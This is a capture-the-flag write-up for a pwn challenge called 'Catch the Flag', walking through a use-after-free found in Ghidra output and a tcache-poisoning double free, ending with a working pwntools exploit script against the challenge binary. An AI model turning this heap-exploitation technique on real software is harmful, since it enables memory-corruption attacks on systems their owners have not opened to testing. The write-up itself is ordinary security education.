+++
date = '2026-03-03'
title = 'Catch the Flag'
tags = ['pwn', 'medium']
+++

Category: Pwn

Difficulty: Medium (461 points)

Author: Azerloc

## Description

I can't get my dog to catch the flag. Can you?

## Challenge files

[catchtheflag](catchtheflag)

## Observations

Running the program, we are displayed with the following options
```
1) Buy a dog
2) Play catch the flag with your dog
3) Buy a cat
4) Post pictures of your cat online
5) Let them eat your dog
6) Watch them eat your cat
0) Quit
```

If we buy a dog and attempt to catch the flag shows us that the dog is not old enough, so we will need to increase the dog's age.

Throwing the executable in ghidra and looking at the main function we immediately see there is a use after free in cat (`local_14` is not reset to 0x0).
```c
    case '6':
      if (local_14 == (void *)0x0) {
        puts("You are catless...");
      }
      else {
        free(local_14);
        puts("They are eating the cat.");
      }
```

We can then use the post pictures function to manipulate some data.
```c
  param_1[1] = param_1[1] + iVar1 % 0x539;
  if (param_1[1] < 0) {
    puts("Wait your cat has a negative amount of followers??? Odd... Anyway");
    fflush(_stdout);
    sleep(1);
  }
  printf("\nYour cat gained %d followers and is now at %d!\n",iVar1 % 0x539,param_1[1]);
  fflush(_stdout);
  sleep(1);
  *param_1 = *param_1 + 1;
```
As seen here the 0-4th byte is modified (likely keeping track of the picture count). And byte 4-8 stores an int keeping track of the follower count.

Now in the catch the flag function we can see that byte 16-20 stores an int keeping track of the age, and all we need to do to win is increase
this to any value over 5.
```c
  if (*(int *)(param_1 + 0x10) < 5) {
    printf("\n%s is too young and is not able to catch the flag yet...\n",param_1);
    fflush(_stdout);
    sleep(1);
  } else {
    puts("\nHe managed to catch the flag!!!");
    win();
  }
```

Lastly in the `newCat` function we see that a cat is 24 bytes, and stores a name in byte 2-18, and in `newDog` we see a dog is 20 bytes,
and stores a name in byte 0-16.

## Solution

This solution uses tCache poisoning.

1. Create a cat
2. Free the cat
3. Post photos of the cat, this will write in the 4-8th bytes, which is where tCache stores the security key preventing a double free.
4. Free the cat again, double free causes the tCache to contain Head -> cat_addr -> cat_addr
5. Create a dog, will be put at the cat_addr position, so tCache will still have Head -> cat_addr
6. Create a cat, since the tCache still has cat_addr this cat will be created at the same position as the dog. 
   Use the cat's name to overwrite the age field of the dog.
7. Catch the flag

## Solution script

```py
from pwn import *

elf = ELF('catchtheflag')
process = elf.process()

def create_dog(name: str):
    process.sendlineafter(b"0) Quit", b"1")
    info("Creating Dog with name: %s", name)
    process.sendlineafter(b"Give it a name", name.encode())

def create_cat(name: str):
    process.sendlineafter(b"0) Quit", b"3")
    info("Creating Cat with name: %s", name)
    process.sendlineafter(b"Give it a name", name.encode())

def post_photos():
    process.sendlineafter(b"0) Quit", b"4")
    info("Posting photos of the cat...")

def catch_flag():
    process.sendlineafter(b"0) Quit", b"2")
    info("Catching the flag...")
    process.interactive()

def free_dog():
    process.sendlineafter(b"0) Quit", b"5")
    info("Freeing the Dog...")

def free_cat():
    process.sendlineafter(b"0) Quit", b"6")
    info("Freeing the Cat...")

create_cat("ExploitCat")
free_cat()
post_photos()
# Tcache now has: Head -> cat -> cat
free_cat()
# Puts at cat's old address
create_dog("FinalDog")
# Create final cat with long name so we overwrite dog age
create_cat("A" * 14)
catch_flag()
process.interactive()
```